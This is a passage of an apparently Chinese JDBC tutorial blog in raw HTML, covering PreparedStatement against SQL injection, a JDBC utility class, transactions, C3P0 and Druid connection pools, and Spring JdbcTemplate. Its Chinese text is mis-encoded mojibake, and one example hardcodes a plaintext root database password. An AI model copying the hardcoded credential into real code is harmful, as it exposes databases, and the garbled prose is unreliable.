class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="type">double</span> balance=rs.getDouble(<span class="number">3</span>);</span><br><span class="line">    System.out.println(id+<span class="string">&quot;---&quot;</span>+name+<span class="string">&quot;---&quot;</span>+balance);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><p>æ‰§è¡Œsqlå¯¹è±¡ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§(é¢„ç¼–è¯‘çš„sqlè¯­å¥)</p><p>è§£å†³sqlæ³¨å…¥é—®é¢˜</p><p>é¢„ç¼–è¯‘sql:å‚æ•°ä½¿ç”¨?ä½œä¸ºå ä½ç¬¦</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span><span class="operator">=</span>&quot;select * from user where username=? and password=?&quot;</span><br></pre></td></tr></table></figure></div><p>è·å–æ‰§è¡Œsqlè¯­å¥çš„å¯¹è±¡</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PreparedStatement Connection.prepareStatement(String <span class="keyword">sql</span>)</span><br></pre></td></tr></table></figure></div><p>ç»™ï¼Ÿèµ‹å€¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setXxxx(å‚æ•°1,å‚æ•°2)</span><br><span class="line">Xxxxæ˜¯å½“å‰ä½ç½®å‚æ•°çš„æ•°æ®ç±»å‹</span><br><span class="line">å‚æ•°1: ï¼Ÿçš„ä½ç½®ç¼–å·ï¼Œä»1å¼€å§‹</span><br><span class="line">å‚æ•°2:ï¼Ÿçš„å€¼</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œsqlï¼Œä¸éœ€è¦ä¼ é€’sqlï¼Œè¯¥ç±»æœ‰ç©ºå‚executexxx()æ–¹æ³•</p><blockquote><p>è¿™ç§æƒ…å†µä¸‹å†sqlæ³¨å…¥ä¼šè¢«é˜²å¾¡ï¼Œæ¨èä½¿ç”¨è¯¥ç±»å®Œæˆå¢åˆ æ”¹æŸ¥</p></blockquote><h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®æ”¹ä¸€æ¡è®°å½•</span></span><br><span class="line"><span class="comment">//æå‡è¦é‡Šæ”¾èµ„æºçš„ä½œç”¨åŸŸ</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql:///test&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ZLL05311223&quot;</span>);<span class="comment">//æŠ›å‡ºå¼‚å¸¸é€‰æ‹©add catch...</span></span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set value=&#x27;è¯—æƒ…ç”»å¥•&#x27; where id=339&quot;</span>;</span><br><span class="line">    <span class="comment">//è·å–æ‰§è¡Œsqlå¯¹è±¡</span></span><br><span class="line">    stmt = conn.createStatement();</span><br><span class="line">    <span class="type">int</span> count=stmt.executeUpdate(sql);</span><br><span class="line">    <span class="comment">//å¤„ç†ç»“æœ</span></span><br><span class="line">    System.out.println(count);</span><br><span class="line">    <span class="keyword">if</span>(count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ä¿®æ”¹å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line">    <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stmt.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="æŠ½å–å·¥å…·ç±»"><a href="#æŠ½å–å·¥å…·ç±»" class="headerlink" title="æŠ½å–å·¥å…·ç±»"></a>æŠ½å–å·¥å…·ç±»</h2><p>å¯ä»¥ç®€åŒ–ä¹¦å†™</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è‡ªå®šä¹‰å·¥å…·ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcUtil</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String url;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String user;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String driver;</span><br><span class="line">    <span class="comment">//æ–‡ä»¶è¯»å–åªéœ€è¦ä¸€æ¬¡  é™æ€ä»£ç å—</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//è¯»å–èµ„æºæ–‡ä»¶ï¼Œè·å–å€¼</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//åˆ›å»ºPropertiesé›†åˆç±»</span></span><br><span class="line">            Properties pro=<span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            <span class="comment">//è·å–srcè·¯å¾„ä¸‹æ–‡ä»¶ä½†æ–¹å¼--&gt;ClassLoader ç±»åŠ è½½å™¨</span></span><br><span class="line">            ClassLoader c=JdbcUtil.class.getClassLoader();</span><br><span class="line">            URL res=c.getResource(<span class="string">&quot;jdbc.properties&quot;</span>);<span class="comment">//è¿”å›URLå¯¹è±¡ï¼Œè¡¨ç¤ºç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦å·</span></span><br><span class="line">            String path=res.toURI().getPath();<span class="comment">//å¾—åˆ°è·¯å¾„,ä½¿ç”¨toURIéœ€è¦try catchå¼‚å¸¸</span></span><br><span class="line">            <span class="comment">//åŠ è½½æ–‡ä»¶</span></span><br><span class="line">            <span class="comment">//pro.load(new FileReader(&quot;src/jdbc.properties&quot;));</span></span><br><span class="line">            pro.load(<span class="keyword">new</span> <span class="title class_">FileReader</span>(path));</span><br><span class="line">            <span class="comment">//è·å–æ•°å€¼ èµ‹å€¼</span></span><br><span class="line">            url=pro.getProperty(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            user=pro.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            password=pro.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            driver=pro.getProperty(<span class="string">&quot;driver&quot;</span>);</span><br><span class="line">            <span class="comment">//æ³¨å†Œé©±åŠ¨</span></span><br><span class="line">            Class.forName(driver);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–è¿æ¥</span></span><br><span class="line">    <span class="comment">//ä¸ä¼ é€’å‚æ•°ï¼Œä½†è¿˜è¦ä¿è¯å·¥å…·ç±»é€šç”¨æ€§</span></span><br><span class="line">    <span class="comment">//ä½¿ç”¨é…ç½®æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnention</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(url,user,password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(Statement stmt,Connection conn)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(ResultSet rs,Statement stmt, Connection conn)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(rs!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(stmt!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>é™æ€ä»£ç å—åªèƒ½ç”¨é™æ€æˆå‘˜å˜é‡ã€é™æ€æˆå‘˜æ–¹æ³•</p><p>é™æ€ä»£ç å—åªèƒ½å¤„ç†å¼‚å¸¸ï¼ˆtry catchï¼‰ ä¸èƒ½æŠ›å¼‚å¸¸ï¼ˆthrowsï¼‰</p><p>åªæœ‰åœ¨srcç›®å½•ä¸‹æ–‡ä»¶æ‰èƒ½é€šè¿‡ç±»åŠ è½½å™¨è·å–èµ„æº</p></blockquote><h2 id="æ§åˆ¶äº‹åŠ¡"><a href="#æ§åˆ¶äº‹åŠ¡" class="headerlink" title="æ§åˆ¶äº‹åŠ¡"></a>æ§åˆ¶äº‹åŠ¡</h2><p>äº‹åŠ¡ï¼šä¸€ä¸ªåŒ…å«å¤šä¸ªæ­¥éª¤çš„ä¸šåŠ¡æ“ä½œï¼Œå¦‚æœè¿™ä¸ªä¸šåŠ¡æ“ä½œè¢«äº‹åŠ¡ç®¡ç†ï¼Œåˆ™è¿™å¤šä¸ªæ­¥éª¤è¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥</p><h3 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h3><ul><li>å¼€å¯äº‹åŠ¡</li><li>æäº¤äº‹åŠ¡</li><li>å›æ»šäº‹åŠ¡</li></ul><h3 id="ä½¿ç”¨Connectionå¯¹è±¡ç®¡ç†äº‹åŠ¡"><a href="#ä½¿ç”¨Connectionå¯¹è±¡ç®¡ç†äº‹åŠ¡" class="headerlink" title="ä½¿ç”¨Connectionå¯¹è±¡ç®¡ç†äº‹åŠ¡"></a>ä½¿ç”¨Connectionå¯¹è±¡ç®¡ç†äº‹åŠ¡</h3><ul><li>å¼€å¯äº‹åŠ¡ void setAutoCommit(boolean autoCommit) :è°ƒç”¨è¯¥æ–¹æ³•è®¾ç½®å‚æ•°ä¸ºfalseï¼Œå³å¼€å¯äº‹åŠ¡ (æ‰§è¡Œsqlå‰)</li><li>æäº¤äº‹åŠ¡ void commit()ã€‚ï¼ˆsqléƒ½æ‰§è¡Œå®Œï¼‰</li><li>å›æ»šäº‹åŠ¡ void rollback() ï¼ˆcatchå¼‚å¸¸ä¸­ï¼‰</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//äº‹åŠ¡æ“ä½œ</span></span><br><span class="line">Connection conn=<span class="literal">null</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt1</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt2</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//è·å–è¿æ¥</span></span><br><span class="line">    conn=JdbcUtil.getConnention();</span><br><span class="line">    <span class="comment">//å¼€å¯äº‹åŠ¡</span></span><br><span class="line">    conn.setAutoCommit(<span class="literal">false</span>);</span><br><span class="line">    <span class="comment">//å®šä¹‰sql</span></span><br><span class="line">    String sql1=<span class="string">&quot;update mystudy set value =value-? where id=?&quot;</span>;</span><br><span class="line">    String sql2=<span class="string">&quot;update mystudy set value =value+? where id=?&quot;</span>;</span><br><span class="line">    <span class="comment">//è·å–æ‰§è¡Œsqlå¯¹è±¡</span></span><br><span class="line">    pstmt1= conn.prepareStatement(sql1);</span><br><span class="line">    <span class="comment">//æ‰‹åŠ¨åˆ¶é€ å¼‚å¸¸</span></span><br><span class="line">    <span class="type">int</span> i=<span class="number">3</span>/<span class="number">0</span>;</span><br><span class="line">    pstmt2= conn.prepareStatement(sql2);</span><br><span class="line">    <span class="comment">//è®¾ç½®å‚æ•°</span></span><br><span class="line">    pstmt1.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">    pstmt1.setInt(<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line">    pstmt2.setDouble(<span class="number">1</span>,<span class="number">500</span>);</span><br><span class="line">    pstmt2.setInt(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    pstmt1.executeUpdate();</span><br><span class="line">    pstmt2.executeUpdate();</span><br><span class="line">    <span class="comment">//æäº¤äº‹åŠ¡</span></span><br><span class="line">    conn.commit();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">//äº‹åŠ¡å›æ»š</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="literal">null</span>) &#123;</span><br><span class="line">            conn.rollback();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">        ex.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    JdbcUtil.close(pstmt1,conn);</span><br><span class="line">    JdbcUtil.close(pstmt2,<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥é˜²æ­¢ä»£ç å› bugä¸­æ–­æ²¡æœ‰å®Œæˆæ‰€æœ‰sqlçš„æ‰§è¡Œ</p></blockquote><h2 id="æ•°æ®åº“è¿æ¥æ± "><a href="#æ•°æ®åº“è¿æ¥æ± " class="headerlink" title="æ•°æ®åº“è¿æ¥æ± "></a>æ•°æ®åº“è¿æ¥æ± </h2><h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><p>å…¶å®å°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼ˆé›†åˆï¼‰ï¼Œå­˜æ”¾æ•°æ®åº“è¿æ¥çš„å®¹å™¨ã€‚å½“ç³»ç»Ÿåˆå§‹åŒ–å¥½åï¼Œå®¹å™¨è¢«åˆ›å»ºï¼Œå®¹å™¨ä¸­ä¼šç”³è¯·ä¸€äº›è¿æ¥å¯¹è±¡ï¼Œå½“ç”¨æˆ·æ¥è®¿é—®æ•°æ®åº“æ—¶ï¼Œä»å®¹å™¨ä¸­è·å–è¿æ¥å¯¹è±¡ï¼Œç”¨æˆ·è®¿é—®å®Œä¹‹åï¼Œä¼šå°†è¿æ¥å¯¹è±¡å½’è¿˜ç»™å®¹å™¨</p><blockquote><p>å¥½å¤„</p><ul><li>èŠ‚çº¦èµ„æº</li><li>ç”¨æˆ·è®¿é—®é«˜æ•ˆ</li></ul></blockquote><h3 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h3><p>æ ‡å‡†æ¥å£ï¼šDataSource javax.sqlåŒ…ä¸‹</p><ul><li>æ–¹æ³•ï¼š<ul><li>è·å–è¿æ¥:getConnection()</li><li>å½’è¿˜è¿æ¥ï¼šå¦‚æœè¿æ¥å¯¹è±¡Connectionæ˜¯ä»è¿æ¥æ± ä¸­è·å–ï¼Œè°ƒç”¨Connention.close()æ–¹æ³•æ˜¯å½’è¿˜è¿æ¥</li></ul></li></ul><p>ä¸€èˆ¬ä¸å®ç°ï¼Œç”±æ•°æ®åº“å‚å•†å®ç°</p><ul><li>C3P0:æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯</li><li>Druidï¼šæ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ï¼Œé˜¿é‡Œå·´å·´æä¾›</li></ul><h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><h4 id="ä½¿ç”¨æ­¥éª¤"><a href="#ä½¿ç”¨æ­¥éª¤" class="headerlink" title="ä½¿ç”¨æ­¥éª¤"></a>ä½¿ç”¨æ­¥éª¤</h4><ul><li>å¯¼å…¥jaråŒ… ä¸¤ä¸ª  mchange-commons-java-0.2.12.jar c3p0-0.9.5.2.jar ä»¥åŠæ•°æ®åº“é©±åŠ¨jaråŒ…</li><li>å®šä¹‰é…ç½®æ–‡ä»¶<ul><li>åç§°ï¼šc3p0.properties æˆ–è€… c3p0-config.xml</li><li>è·¯å¾„ï¼šç›´æ¥æ”¾åœ¨srcç›®å½•ä¸‹</li></ul></li><li>åˆ›å»ºæ ¸å¿ƒå¯¹è±¡ æ•°æ®åº“è¿æ¥æ± å¯¹è±¡ ComboPooledDataSource</li><li>è·å–è¿æ¥ getConnection</li></ul><h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><h4 id="æ­¥éª¤-2"><a href="#æ­¥éª¤-2" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h4><ul><li>å¯¼å…¥jaråŒ… druid-1.0.9.jar ä»¥åŠæ•°æ®åº“é©±åŠ¨jaråŒ…</li><li>å®šä¹‰é…ç½®æ–‡ä»¶<ul><li>propertieså½¢å¼</li><li>å¯ä»¥å«ä»»æ„åç§°ï¼Œå¯ä»¥æ”¾ä»»æ„ç›®å½•</li></ul></li><li>è·å–æ•°æ®åº“è¿æ¥æ± å¯¹è±¡ï¼š é€šè¿‡å·¥å‚ç±»è·å– DruidDataSourceFactory</li><li>è·å–è¿æ¥</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŠ è½½é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> DruidDemo.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>);</span><br><span class="line">pro.load(is);</span><br><span class="line"><span class="comment">//è·å–è¿æ¥æ± å¯¹è±¡</span></span><br><span class="line">DataSource ds= DruidDataSourceFactory.createDataSource(pro);</span><br><span class="line"><span class="comment">//è·å–è¿æ¥</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ds.getConnection();</span><br><span class="line">System.out.println(conn);</span><br></pre></td></tr></table></figure></div><h4 id="å·¥å…·ç±»"><a href="#å·¥å…·ç±»" class="headerlink" title="å·¥å…·ç±»"></a>å·¥å…·ç±»</h4><ul><li>å®šä¹‰ä¸€ä¸ªå·¥å…·ç±»JdbcUtils</li><li>æä¾›é™æ€ä»£ç å—åŠ è½½é…ç½®æ–‡ä»¶ï¼Œåˆå§‹åŒ–è¿æ¥æ± å¯¹è±¡</li><li>æä¾›æ–¹æ³•<ul><li>è·å–è¿æ¥æ–¹æ³•ï¼šé€šè¿‡æ•°æ®åº“è¿æ¥æ± è·å–è¿æ¥</li><li>é‡Šæ”¾èµ„æºä¸°å¯Œ</li><li>è·å–è¿æ¥æ± çš„æ–¹æ³•</li></ul></li></ul><h2 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h2><p>Springæ¡†æ¶å¯¹JDBCçš„ç®€å•å°è£…ï¼Œæä¾›äº†ä¸€ä¸ªJDBCTemplateå¯¹è±¡ç®€åŒ–å¯¹JDBCçš„å¼€å‘</p><h3 id="ä½¿ç”¨æ­¥éª¤-1"><a href="#ä½¿ç”¨æ­¥éª¤-1" class="headerlink" title="ä½¿ç”¨æ­¥éª¤"></a>ä½¿ç”¨æ­¥éª¤</h3><ul><li><p>å¯¼å…¥jaråŒ…ï¼Œ5ä¸ª</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4cladmloaj20vi07k3z3.jpg"                      alt="image-20220719220914974"                ><figcaption>image-20220719220914974</figcaption></figure></p></li><li><p>åˆ›å»ºJdbcTemplateå¯¹è±¡ï¼Œä¾èµ–äºæ•°æ®æºDataSource</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JdbcTemplate tmp=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(ds)  <span class="comment">//dsæ˜¯DataSourceå¯¹è±¡</span></span><br></pre></td></tr></table></figure></div></li><li><p>è°ƒç”¨JdbcTemplateçš„æ–¹æ³•æ¥å®ŒæˆCRUDçš„æ“ä½œ</p><ul><li><p>update() æ‰§è¡ŒDML å¢åˆ æ”¹</p></li><li><p>queryForMap() æŸ¥è¯¢ç»“æœå°†ç»“æœå°è£…æˆmapé›†åˆ</p><ul><li><p>ç»“æœé›†å°è£…æˆmapé›†åˆï¼Œåˆ—åä½œä¸ºkeyï¼Œå€¼ä½œä¸ºvalue</p></li><li><p>ç»“æœé›†é•¿åº¦åªèƒ½æ˜¯1</p></li></ul></li><li><p>queryForList() æŸ¥è¯¢ç»“æœå°†ç»“æœå°è£…æˆlisté›†åˆ</p><ul><li>å°†æ¯ä¸€æ¡è®°å½•å°è£…æˆMapï¼Œåœ¨è£…è½½åˆ°Listé›†åˆä¸­</li></ul></li><li><p>query() æŸ¥è¯¢ç»“æœï¼Œå°†ç»“æœå°è£…ä¸ºJavaBeanå¯¹è±¡</p><ul><li>å‚æ•° RowMapper<ul><li>ä¸€èˆ¬ä½¿ç”¨BeanPropertyRowMapperå®ç°ç±»ï¼Œå¯ä»¥å®Œæˆæ•°æ®åˆ°JavaBeançš„è‡ªåŠ¨å°è£…</li><li>new BeanPropertyRowMapper&lt;ç±»å‹&gt;(ç±»å‹.class)</li></ul></li></ul></li><li><p>queryForObject:æŸ¥è¯¢ç»“æœï¼Œå°†ç»“æœå°è£…æˆå¯¹è±¡</p><ul><li>ä¸€èˆ¬ç”¨äºèšåˆå‡½æ•°çš„æŸ¥è¯¢</li></ul></li></ul></li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 